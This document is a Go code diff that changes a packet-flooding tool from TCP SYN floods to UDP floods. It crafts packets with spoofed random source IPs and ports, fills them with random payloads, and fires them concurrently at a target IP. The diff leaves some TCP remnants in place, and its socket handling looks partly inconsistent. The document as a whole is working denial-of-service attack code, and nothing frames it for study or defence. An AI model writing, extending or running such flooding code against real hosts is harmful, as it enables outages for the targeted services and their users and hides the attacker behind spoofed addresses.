@@ -23,7 +23,18 @@ func randIP() string {
 	return fakeIP
 }
 
-// makes the TCP SYN packet with a spoofed source IP and source port
+func randomPayload() string {
+	// just a bunch of random numbers added into a string
+	// supposed to be random noise for the payload
+	s := fmt.Sprintf("%d", rand.Int63())
+	s += fmt.Sprintf("%d", rand.Int63())
+	s += fmt.Sprintf("%d", rand.Int63())
+	s += fmt.Sprintf("%d", rand.Int63())
+	return s
+
+}
+
+// makes the UDP packet with a spoofed source IP and source port
 // returns net/ipv4 header and bytes of tcp packet
 func makePacket(destPortSrc int, destIP net.IP) (*ipv4.Header, []byte) {
 	// the IP packet
@@ -39,14 +50,9 @@ func makePacket(destPortSrc int, destIP net.IP) (*ipv4.Header, []byte) {
 	srcPort := layers.TCPPort(rand.Intn(65535)) // 2^16 possible ports
 
 	// tcp syn packet
-	tcpPacket := layers.TCP{
+	udpPacket := layers.UDP{
 		SrcPort: srcPort,
 		DstPort: destPort,
-		Seq:     rand.Uint32(), // random sequence cause why not
-		Window:  65535,
-		Urgent:  0,
-		Ack:     0,
-		SYN:     true,
 	}
 
 	sOpts := gopacket.SerializeOptions{
@@ -55,38 +61,42 @@ func makePacket(destPortSrc int, destIP net.IP) (*ipv4.Header, []byte) {
 	}
 
 	// do the checksum at network layer
-	tcpPacket.SetNetworkLayerForChecksum(&ipPacket)
+	udpPacket.SetNetworkLayerForChecksum(&ipPacket)
 
 	// ipHeader serialization
 	ipHeaderBuffer := gopacket.NewSerializeBuffer()
-	ipPacket.SerializeTo(ipHeaderBuffer, sOpts)
+	err := ipPacket.SerializeTo(ipHeaderBuffer, sOpts)
+	if err != nil {
+		handleErr(err)
+	}
 
 	ipHeader, err := ipv4.ParseHeader(ipHeaderBuffer.Bytes())
 	if err != nil {
 		handleErr(err)
 	}
 
-	tcpBuffer := gopacket.NewSerializeBuffer()
+	udpBuffer := gopacket.NewSerializeBuffer()
 
-	gopacket.SerializeLayers(tcpBuffer, sOpts, &tcpPacket)
+	udpPayload := gopacket.Payload(randomPayload())
+	gopacket.SerializeLayers(udpBuffer, sOpts, &udpPacket, udpPayload)
 
-	return ipHeader, tcpBuffer.Bytes()
+	return ipHeader, udpBuffer.Bytes()
 }
 
 // runs TCP flood to destination IP for as many packets as given
-func TCPFlood(destIPStr string, totalPacketToSend int) {
+func UDPFlood(destIPStr string, totalPacketToSend int) {
 	// setting random seed
 	rand.Seed(time.Now().UnixNano())
 
 	destIP := net.ParseIP(destIPStr)
-	tcpPorts := globals.GetTCPPorts()
+	udpPorts := globals.GetUDPPorts()
 	// loop as many times as given
 	for packetCounter := 0; packetCounter < totalPacketToSend; packetCounter++ {
 		// this can happen concurrently
-		go func(tcpPorts []int, destIP net.IP) {
+		go func(udpPorts []int, destIP net.IP) {
 			// making the packet with a random port from list and dest IP
-			ipHeader, packetBytes := makePacket(tcpPorts[rand.Intn(len(tcpPorts))], destIP)
-			packetConn, err := net.ListenPacket("ip4:tcp", destIPStr)
+			ipHeader, packetBytes := makePacket(udpPorts[rand.Intn(len(udpPorts))], destIP)
+			packetConn, err := net.ListenPacket("udp4", destIPStr)
 			if err != nil {
 				handleErr(err)
 			}
@@ -100,11 +110,11 @@ func TCPFlood(destIPStr string, totalPacketToSend int) {
 
 			rawConn.Close()
 
-		}(tcpPorts, destIP)
+		}(udpPorts, destIP)
 	}
 
 }
 
 func handleErr(message error) {
-	fmt.Println("TCPFLOOD error: " + message.Error())
+	fmt.Println("UDPFLOOD error: " + message.Error())
 }
